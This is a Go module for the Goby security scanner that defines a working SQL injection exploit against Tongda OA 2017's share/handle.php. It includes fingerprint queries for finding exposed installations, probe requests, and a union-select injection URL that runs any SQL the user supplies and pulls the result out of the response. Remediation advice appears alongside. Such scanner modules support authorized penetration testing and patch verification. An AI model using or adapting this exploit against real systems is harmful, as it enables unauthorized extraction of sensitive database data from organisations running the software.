package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TongdaOA share/handle.php SQL Injection Vulnerability",
    "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>A SQL injection vulnerability exists in the module parameter of the share/handle.php file of Tongda OA2017-v20200417 version, and attackers can obtain sensitive database data through the vulnerability.</p>",
    "Product": "TongdaOA",
    "Homepage": "https://www.tongda2000.com/",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "GobyQuery": "body=\"/static/templates/2013_01/index.css/\" || body=\"javascript:document.form1.UNAME.focus()\" || body=\"href=\\\"/static/images/tongda.ico\\\"\" || body=\"<link rel=\\\"shortcut icon\\\" href=\\\"/images/tongda.ico\\\" />\" || (body=\"OA提示：不能登录OA\" && body=\"紧急通知：今日10点停电\") || title=\"Office Anywhere 2013\" || title=\"Office Anywhere 2015\" || (body=\"tongda.ico\" && (title=\"OA\" || title=\"办公\")) || body=\"class=\\\"STYLE1\\\">新OA办公系统\"",
    "Level": "2",
    "Impact": "<p>A SQL injection vulnerability exists in the module parameter of the share/handle.php file of Tongda OA2017-v20200417 version, and attackers can obtain sensitive database data through the vulnerability.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "https://www.tongda2000.com/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select/**/user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/share/handle.php?_GET[module]=1",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"status\":\"1\",\"short_url",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/share/handle.php?_GET[module]=1'",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "/share/handle.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/share/handle.php?_GET[module]=1''",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"status\":\"1\",\"short_url",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/share/handle.php?_GET[module]=1'+and+1={%60='%60+1}+and+1=0+union+select+({{{sql}}})--+%27",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{\"status\":\"1\",\"short_url\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"img_url\":\"\\\\\\/share\\\\\\/(.*?)\\.png"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "TongdaOA share/handle.php文件SQL注入漏洞",
            "Product": "通达oa",
            "Description": "<p>通达OA办公系统是由<span style=\"color: rgb(62, 62, 62);\">北京通达信科科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的协同办公OA系统。</span></span></p><p><font color=\"#3e3e3e\">通达OA2017-v20200417版本的share/handle.php文件的module参数存在SQL注入漏洞，攻击者可以通过漏洞获取数据库敏感数据。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户升级至11.x或者12.x最新版（2017未修复）：<a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">通达OA2017-v20200417版本的<span style=\"color: rgb(62, 62, 62); font-size: 16px;\">share/handle.php</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\"></span>文件的module参数存在SQL注入漏洞，攻击者可以通过漏洞获取数据库敏感数据。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "TongdaOA share/handle.php SQL Injection Vulnerability",
            "Product": "TongdaOA",
            "Description": "<p>Tongda OA office system is a simple and practical collaborative office OA system developed by Beijing Tongda Xinke Technology Co., Ltd.</p><p>A SQL injection vulnerability exists in the module parameter of the <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">share/handle.php</span>&nbsp;file of Tongda OA2017-v20200417 version, and attackers can obtain sensitive database data through the vulnerability.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed, please upgrade to the latest version of 11.x or 12.x (not fixed in 2017): <a href=\"https://www.tongda2000.com/\">https://www.tongda2000.com/</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">A SQL injection vulnerability exists in the&nbsp;module parameter of the <span style=\"color: rgb(22, 28, 37); font-size: 16px;\">share/handle.php</span>&nbsp;file of Tongda OA2017-v20200417 version, and attackers can obtain sensitive database data through the vulnerability.</span><br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10698"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}